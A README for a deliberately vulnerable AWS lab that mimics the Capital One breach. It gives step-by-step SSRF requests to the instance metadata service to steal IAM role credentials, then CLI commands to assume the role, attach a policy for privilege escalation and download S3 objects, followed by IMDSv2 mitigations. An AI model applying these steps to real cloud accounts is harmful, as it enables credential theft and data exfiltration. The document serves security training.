# caponeme

***caponeme*** is a vulnerable cloud environment that meant to mock Capital One Breach for educational purposes

## Disclaimer

This CloudFormation template is **NOT** intended for deployment in a production account / environment. It is an example for a vulnerable web application that allows AWS credentials being compromised. Please use this with **CAUTION** and consider using new AWS account for this kind of experiment.

## What is Capital One Breach?

[Click here to find out](https://www.capitalone.com/facts2019/)

## Getting Started

- Make sure you have the latest version of `awscli` installed on your terminal.
- ~~Make sure you run this from the `us-east-1` (North Virginia) region on the AWS Console.~~ Run now in every region.
- To get access to the Bitnami LAMP Stack AMI, visit https://aws.amazon.com/marketplace/pp/B072JNJZ5C/, click on "Continue to Subscribe" and then click on "Accept Terms".
- Deploy [this Cloudformation Macro](https://github.com/awslabs/aws-cloudformation-templates/tree/a11722da8379dd52726ecfcd552f7983e9bb563f/aws/services/CloudFormation/MacrosExamples/S3Objects) to allow the upload of an object to the S3 bucket. (It should be deployed for each region you wish to launch this template)

### What are we deploying

Instead of listing all of the ressources deployed by this template, find below an overview made using [cloudcraft.co](https://cloudcraft.co/). The only costing resource is a **t2.micro** EC2 instance which is covered by the AWS free tiers.

![Resources deployed via CloudFormation](/img/HackLab.png)

### Deployment

- Download the `capmeonesim.yaml` file.
- Log in to the AWS console
- Go to CloudFormation service
- Create new stack and upload the `capmeonesim.yaml` file you downloaded.
- Allow the template to create IAM resources on your behalf, as well as to require the **CAPABILITY\_AUTO\_EXPAND** capability and create the stack.
- Click on the `SSRFWebURL` URL from the CloudFormation Template Outputs, it will redirect you to the vulnerable web application.

*This is the page you should expect to see:*
![image](/img/71972441-89b7bf00-3204-11ea-9a96-73fd7b8a9036.png)

### Discovering the contents of the S3 Bucket

- On the web application, type the following to get the IAM role name: http://169.254.169.254/latest/meta-data/iam/security-credentials
- Using the IAM role name you got on the previous step, discover the AWS credentials http://169.254.169.254/latest/meta-data/iam/security-credentials/[IAMRoleName]
- You'll get something like:
````
{ "Code" : "Success", "LastUpdated" : "2019-12-22T21:42:57Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIASANNLTVCBCFP445O", "SecretAccessKey" : "v0osgTGnL0n09dHQA6xztS/ZuSS3p8yu+JZ1cAxG", "Token" : "IQoJb3JpZ2luX2VjELb//////////wEaCXVzLWVhc3QtMSJHMEUCIDneXlD6+JLk68XRrQ4X+LrBewvq/9kIYRYhonnW5T9qAiEAmpuGWXeh4rqQ14gmiMU8NvKlxODFh23u5qubMpvC9Rkq0QIIHxABGgwxMzgzMzkzOTI4MzYiDCO/mt42DCCYPTmeJSquAstMGvng3WUgZXlgpm5NiJ+RbYQvnmA1BmIt94LcJeoNpC87MZhxpubTd69zWEqtriLRBXp7KoNQNX5K8ag5eY27R0giQssmidCFED9N/uOgD1Tu33vaVEJoFhzKrd1lhFule3EOHFhImRRGsyfalfY7TWN0GaRNGZlanWdBswpkescM3O43G9J27xeMO22ziu4ajonkCaG51r39/LKj5C1g2VfdXPp5sI0q5+qiG0YSXveN6mGqnN5NXAKNGd4ehYdo4Ot01niy0oS9xtDMLSTVu3XjaxGJwqF5fb4l8Q9zGFe3zA94UShK1uGRBWOfTMHZRwaGYRSTcwximDjEWO4UPKYa50Es5d/12hJdwuFIXPC82i9LyBHXw/ayYn1xyH3bpBwBoYHiereBSuMmMNPG/+8FOs4CX49Hw3xx4pz2/ibkiJ1hjh2/Qu4KZtfTk4SN49q/EAgmP6dx6l/17pRi+T+B7bGk+cES0Ei2806uoTArK8STiO/W3PejELPeoWgy2av+oiL/zt4xXI+hNFdO1xXZXrBGaLbKTZRby+MyrvmDw8GJpxmE1Pyt42pRjxdeQ0NLEcM05JHtxq0/73tEUepsm0Z+6RUqXi9+/BSaP1tRzViApch36d8oJgWARZY5A1eX1d82hCeCiGgNuZxPWC53H3lNXjSRC3dGrx3dI8IJwXgQgEj8e3QP4eeoN3+3H2XFlXE+DopMy6P4ejk8c6Xdk41FbJZrTe1ZoulF2OxLfQbmCOcl85xqJyDEWuZleddagb3jr/Kp7X3Io4bgA+cc0kuQEdLEkfWsKoE8G/uCkSy+tFwn0eqAUmoLVqCxmXS++ZOK3+VX1axY1EMzp68S1g==", "Expiration" : "2019-12-23T04:17:43Z" }
````

- If using Linux, type the following on your terminal to impersonate the IAM role
  ````
  export AWS_ACCESS_KEY_ID="<AccessKeyId>"
  export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
  export AWS_SESSION_TOKEN="<Token>"
  ````

- If using Windows, type the following on your terminal to impersonate the IAM role
  ````
  set AWS_ACCESS_KEY_ID=<AccessKeyId>
  set AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
  set AWS_SESSION_TOKEN=<Token>
  ````
  *Note: Do not include quotes when setting Windows env variables.*

  - If it doesn't work on Windows, you can also modify the AWS credential file at `C:\Users\[username]\.aws\credentials`, as shown on the below capture:

  ![capture](/img/capture.PNG)

### Permission Escalation and Lateral Movement

This additional step aims at explaining the standard privilege escalation process in AWS:

- Let's find the exact IAM policy (Customer managed one) attached to our role using `aws iam  list-role-policies --role-name <IAMRoleName>`
- Let's now show our exact permission `aws iam get-role-policy --role-name <IAMRoleName> --policy-name <IAMPolicyName>` 

This policy reveals that there is only one other policy we can attach to our instance. In a real-life attack scenario, we would be attempted to list available policies and drop all of their content in a scripted fashion in a text file. But as we are here to learn, here how to do for our specific S3 access policy **[OPTIONAL STEP]**: 

- List Customer Managed policies `aws iam list-policies --scope Local`
- Get the latest version of an IAM policy with `aws iam get-policy --policy-arn <IAMPolicyS3Arn>`
- Show the content of the last version of the considered policy `aws iam  get-policy-version --policy-arn <IAMPolicyS3Arn> --version-id <versionID>`

- The last step consists in attaching the policy to our current IAM role `aws iam attach-role-policy --role-name <IAMRoleName> --policy-arn <IAMPolicyS3Arn>`

### Discovering the contents of the S3 Bucket

- Let's list the available buckets in the AWS account[^1] `aws s3api list-buckets`
- Now, you can see all the objects inside this bucket with `aws s3api list-objects --bucket <YOUR-S3-BUCKET>`
- Then, you can download the bucket objects using `aws s3api get-object --bucket <YOUR-S3-BUCKET> --key <YOUR-S3-OBJECT> demo.txt`

### Mitigation

#### Mitigation #1 - Enable Security Token on Metadata Service

- From a privileged shell session on your AWS account (not the hacked session), type the following command to enable security token on metadata server of the instance:

  ````
  aws ec2 modify-instance-metadata-options --instance-id <INSTANCE-ID> --http-endpoint enabled --http-token required
  ````
- Using your web browser, switch to the vulnerable web application and repeat [these steps](#discovering-the-contents-of-the-s3-bucket). What happens?

- Roll back by running the following command:
  ````
  aws ec2 modify-instance-metadata-options --instance-id <INSTANCE-ID> --http-endpoint enabled --http-token optional
  ````

#### Mitigation #2 - Limit Role Access Credentials to Instance Metadata Service V2

- Go to the IAM role attached to the EC2 Instance, by locating the instance, then pressing on the entity written on `IAM role`. Press on `Attach inline policy`, then apply the following policy:

  ````
  {
      "Version": "2012-10-17",
      "Statement": [
          {
              "Sid": "RequireImdsV2",
              "Effect": "Deny",
              "Action": "*",
              "Resource": "*",
              "Condition": {
                  "StringNotEquals": {
                      "ec2:MetadataHttpTokens": "required"
                  }
              }
          }
      ]
  }
  ````
- Call the policy `IMDSv2InlinePolicy`, press `Review policy` and then `Create policy`.
- Try to run the `list-objects` or `get-object` from the "hacked" shell again. What happens?

### Cleanup

- Empty the S3 Bucket
- Delete the CloudFormation stack (won't work if you haven't cleared the bucket from objects)

## Todos

 - You tell me?

## Credits

We're using some tech to make this work:

* [Giraffe](https://github.com/osirislab/Giraffe) - Vulnerable web application
* [Bitnami LAMP Stack](https://bitnami.com/stack/lamp) - AMI using to quickly provision the EC2 Instance

License
----

MIT

[^1]: To do so, we had to allow to list all of the S3 buckets present in the AWS account, while the object resources can only be read from the bucket created by this template. Again, don't run this template in a production account. 